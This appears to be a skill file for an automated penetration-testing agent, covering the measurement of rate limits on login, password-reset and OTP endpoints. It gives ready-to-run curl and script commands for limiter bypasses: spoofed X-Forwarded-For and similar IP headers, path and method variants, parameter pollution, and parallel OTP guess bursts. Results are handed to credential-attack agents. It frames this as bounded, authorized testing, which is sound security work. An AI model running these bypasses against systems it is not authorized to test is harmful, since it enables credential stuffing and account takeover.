---
name: rate_limit_mapping
agent: agent4_auth
description: Measure per-endpoint rate limits (login, reset, OTP, MFA), fingerprint the limiter key, then test bypasses: header rotation, endpoint/method variants, race windows.
---

# Rate Limit Mapping

## Purpose

Authentication endpoints without effective rate limiting fall to credential stuffing and OTP brute force; endpoints with rate limiting often fall to bypasses — `X-Forwarded-For` rotation, endpoint variants that hit the same handler, or race windows where N parallel requests slip through before the counter updates. This skill measures the real limit on each sensitive endpoint (threshold, window, block behavior) with controlled probing, fingerprints what the limiter keys on (IP? user? header?), then tests each bypass class one at a time. A working bypass on login, password-reset, or OTP verification is a direct account-takeover enabler — and it chains with every credential attack the other agents run.

## Division of labor

- **Consumes:** the sensitive-endpoint list (login, password reset, OTP/MFA verify, register, token refresh) and a valid test account for user-keyed limiter tests
- **Produces:** the finished artifact — `findings/rate_limit_mapping_confirmed.md` with the per-endpoint limit table (threshold/window/block behavior/limiter key) and raw pairs for every CONFIRMED bypass

## When to use / when NOT to use

- **Use when:** the target has login, password-reset, OTP/MFA, or registration endpoints reachable unauthenticated; a sibling skill needs to know whether brute force is viable
- **Skip when (time-pass filter):** the endpoint already demands a CAPTCHA or proof-of-work per attempt that you cannot pass (the bypass surface is the CAPTCHA, not the limiter — does it leak? no. is it sensitive? the limiter isn't the control). Stay within responsible limits: measure, don't DoS — bounded request counts, sleeps between probes, stop at the first hard block signal (429 with long Retry-After, IP ban page, WAF challenge). Never probe production at burst rates that could degrade service for others.

## Methodology

1. Inventory the sensitive endpoints and rank them: login, password reset request, OTP/MFA verify, registration, token refresh. OTP verify is priority one — 6-digit codes fall in ~hours unthrottled and minutes with a bypass.
2. Baseline first: record the known-dead path response and one legitimate single request to each endpoint (valid shape, wrong credentials). Note every rate-related header (`Retry-After`, `X-RateLimit-*`, `RateLimit-*`) even on 200s — some limiters advertise policy.
3. Measure the threshold per endpoint with the helper (`rate_probe.py`, default 40 requests at 1 per 2s — slow on purpose). Record: request number of first block, block status code (429? 403? silent 200-drop? CAPTCHA page?), block body, and whether the counter is per-endpoint or global (probe two endpoints interleaved — if both block, the bucket is shared).
4. Measure the window: after hitting the block, wait and re-probe at intervals (1m, 5m, 15m) to find when the bucket resets. Record `Retry-After` if sent. A window you can measure is a window you can schedule around.
5. Fingerprint the limiter key. Run the same probe four ways, changing one variable: (a) rotate `X-Forwarded-For` per request — no block = IP-keyed limiter trusting a spoofable header; (b) rotate the username/account per request — no block = account-keyed; (c) rotate User-Agent — rarely the key, but cheap to rule out; (d) keep everything fixed but change source egress if available. The variable that defeats the block IS the key.
6. If the key is `X-Forwarded-For`/`X-Real-IP`, confirm the bypass properly: run the full probe with per-request IP rotation and show the block never triggers while the fixed-IP control blocks. Also try the header list: `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP`, `Forwarded: for=`, `True-Client-IP`, `CF-Connecting-IP` — record which ones the limiter honors.
7. Test endpoint variants that may hit the same handler with a fresh bucket: trailing slash (`/login/`), case change (`/Login`), alternate paths (`/api/v1/login` vs `/api/login` vs `/auth/login`), URL-encoded chars (`/log%69n`), semicolon params (`/login;.js`), and query-string presence (`/login?x=1`). For each variant, run a short probe (10 requests fast) — a variant that doesn't count against the main bucket is a CONFIRMED bypass.
8. Test method variants: if login is POST-only, try GET with credentials in query, PUT, PATCH. A 405 is NEGATIVE; a 200/401 that processes the attempt outside the limiter is a finding.
9. Test parameter pollution on the rate-limit key: if the limiter keys on username, try `username=victim&username=victim`, `username[]=victim`, JSON vs form encoding of the same field. If different encodings produce different key derivations, the bypass is real — verify by showing N attempts with no block vs control.
10. Test the race window: fire a burst of parallel requests (helper `--burst 20`, one shot only) inside the window before the counter updates. If 20 parallel OTP guesses all return "wrong code" instead of a block, the limiter counts after response, not before — burst-sized brute force is viable. One burst is measurement; repeated bursts are DoS — do not loop it.
11. Test block-behavior weaknesses: does the block apply per-account (lockout = user enumeration/DoS on victims)? Does a blocked IP get a longer block on continued probing (escalating ban — stop immediately)? Does the block page leak why (distinguishing "rate limited" from "wrong password" = user enumeration)?
12. Verdict every endpoint and every bypass: CONFIRMED only with baseline + 2x reproduction (two separate measurement runs showing the same threshold, or two bypass demonstrations) + raw pairs; INCONCLUSIVE when the block behavior needs longer observation than the run allows; NEGATIVE for dead ends (limiter holds across all bypass classes — document the threshold so brute-force agents don't waste time).

## Exact commands

Baseline (known-dead path control + single legitimate attempt + header capture):

```bash
BASE="https://<TARGET>"
DEAD="/this-path-is-dead-9f3k2"
curl -sk -o /dev/null -w "dead-path: %{http_code} %{size_download}\n" "$BASE$DEAD"
echo "== one legitimate login attempt, capture rate headers =="
curl -sk -D /tmp/login.h -o /tmp/login.b -w "%{http_code} %{size_download}\n" \
  -X POST "$BASE/login" --data-urlencode "username=<USER>" --data-urlencode "password=wrongpass"
grep -iE 'ratelimit|retry-after|limit' /tmp/login.h || echo "(no rate headers advertised)"
```

Threshold measurement with the helper (slow defaults — measurement, not DoS):

```bash
cd ~/workspace/hackbot-skills/START/agent4_auth/rate_limit_mapping
python3 rate_probe.py --url "$BASE/login" --method POST \
  --data 'username=<USER>&password=wrongpass' --count 40 --delay 2
# record: first-block request #, block code/body, then check /tmp output for the summary
```

Window measurement — after a block, re-probe at intervals:

```bash
for WAIT in 60 300 900; do
  echo "waiting ${WAIT}s..."; sleep $WAIT
  printf "after ${WAIT}s -> "; curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" \
    -X POST "$BASE/login" --data-urlencode "username=<USER>" --data-urlencode "password=wrongpass"
done
```

Limiter-key fingerprint — rotate X-Forwarded-For per request (fixed-IP run is the control):

```bash
python3 rate_probe.py --url "$BASE/login" --method POST \
  --data 'username=<USER>&password=wrongpass' --count 40 --delay 2 --xff-rotate
# no block with rotation + block without = IP-keyed limiter trusting XFF => bypass
```

Which IP headers does the limiter honor:

```bash
for H in 'X-Forwarded-For: 10.9.9.9' 'X-Real-IP: 10.9.9.9' 'X-Originating-IP: 10.9.9.9' 'Forwarded: for=10.9.9.9' 'True-Client-IP: 10.9.9.9' 'CF-Connecting-IP: 10.9.9.9'; do
  printf "[$H] -> "; curl -sk -H "$H" -o /dev/null -w "%{http_code}\n" \
    -X POST "$BASE/login" --data-urlencode "username=<USER>" --data-urlencode "password=wrongpass"
done
# then re-run the threshold probe with the honored header rotating to confirm the bypass holds
```

Endpoint variants — short fast probes per variant (fresh bucket test):

```bash
for V in '/login/' '/Login' '/api/login' '/auth/login' '/login?x=1' '/log%69n'; do
  printf "variant %-14s -> " "$V"
  for i in $(seq 1 10); do
    CODE=$(curl -sk -o /dev/null -w "%{http_code}" -X POST "$BASE$V" --data-urlencode "username=<USER>" --data-urlencode "password=wrongpass")
    printf "%s " "$CODE"
  done; echo
done
# a variant showing ten 401s while /login blocks at request ~N = CONFIRMED bypass
```

Method variants:

```bash
printf "GET with creds in query -> "; curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE/login?username=<USER>&password=wrongpass"
printf "PUT -> "; curl -sk -X PUT -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE/login" --data-urlencode "username=<USER>" --data-urlencode "password=wrongpass"
```

Race-window burst — one shot of 20 parallel requests (do NOT loop):

```bash
python3 rate_probe.py --url "$BASE/api/otp/verify" --method POST \
  --data '{"code":"000000"}' --json --burst 20
# 20x "wrong code" with no block = counter updates after response => burst brute force viable
```

Block-behavior checks (enumeration / victim-DoS side effects):

```bash
# does the block distinguish accounts? (wrong-password vs rate-limited on a second account)
printf "second account during block -> "; curl -sk -o /dev/null -w "%{http_code} %{size_download}\n" \
  -X POST "$BASE/login" --data-urlencode "username=<OTHER_USER>" --data-urlencode "password=wrongpass"
# does the block page leak the reason?
curl -sk -X POST "$BASE/login" --data-urlencode "username=<USER>" --data-urlencode "password=wrongpass" | head -c 400; echo
```

## Completion-bias defenses

- [ ] Sensitive endpoints inventoried and ranked (login / reset / OTP / MFA / register / refresh)
- [ ] Dead-path baseline + single-attempt baseline recorded with rate headers captured
- [ ] Threshold measured per endpoint (first-block #, block code, block body)
- [ ] Shared-vs-per-endpoint bucket tested (interleaved probes)
- [ ] Window measured (reset timing, Retry-After recorded)
- [ ] Limiter key fingerprinted (XFF rotation / account rotation / UA rotation / fixed control)
- [ ] Honored IP-header list enumerated
- [ ] Endpoint variants probed (trailing slash, case, alt paths, encoding, query)
- [ ] Method variants tested (GET/PUT/PATCH)
- [ ] Parameter-pollution key confusion tested where limiter is account-keyed
- [ ] Race-window burst run exactly once per endpoint
- [ ] Block-behavior side effects checked (enumeration, victim lockout, escalating bans — stopped at first hard signal)
- [ ] Every endpoint and bypass has a verdict: CONFIRMED / INCONCLUSIVE / NEGATIVE
- **Review step:** agent10_review must verify (1) `findings/rate_limit_mapping_confirmed.md` exists with the per-endpoint limit table, (2) every CONFIRMED bypass shows the fixed-control block AND the bypass run with raw pairs, (3) probe rates stayed within responsible bounds (no repeated bursts, sleeps between probes, stop at hard block), (4) no verdict claims a bypass from a single un-reproduced run.
- **Nudge prompts:** "Keep going until you have fingerprinted the limiter key and tested every bypass class, not just the first X-Forwarded-For rotation." / "Do not report done before the finished artifact exists on disk with the per-endpoint table." / "One burst is measurement, two is a DoS — never loop the race window."
- **Finished artifact definition:** `findings/rate_limit_mapping_confirmed.md` — per-endpoint table (endpoint | threshold | window | block behavior | limiter key | verdict), bypass results per class with raw pairs, and the responsible-limits log (request counts, rates, stop conditions honored).

## Evidence standard

- Baseline: every measurement compared against the known-dead path and the single legitimate attempt on the same host
- Reproduction: 2x independent reproduction required (two threshold runs agreeing, or two bypass demonstrations; fresh window between runs)
- Raw evidence: helper output logs + full request/response pairs for the block event and the bypass event (status, rate headers, body excerpt)
- Verdicts: CONFIRMED (baseline + 2x repro + raw pairs) / INCONCLUSIVE (needs longer window observation or human — state exactly what) / NEGATIVE (limiter holds across all bypass classes, threshold documented so brute-force agents don't waste time)

## Handoffs

- Credential-attack agents: consume the per-endpoint table — viable brute-force targets (no limit or CONFIRMED bypass) vs off-limits targets (holding limiter with documented threshold)
- `jwt_edge_cases`: receives token-endpoint limiter data (login/refresh thresholds) for token-issuance abuse assessment
- `role_oracle`: receives any account-keyed limiter observations (lockout differentials can be user-enumeration oracles)
- agent10_review: consumes `findings/rate_limit_mapping_confirmed.md` as the shippable evidence bundle
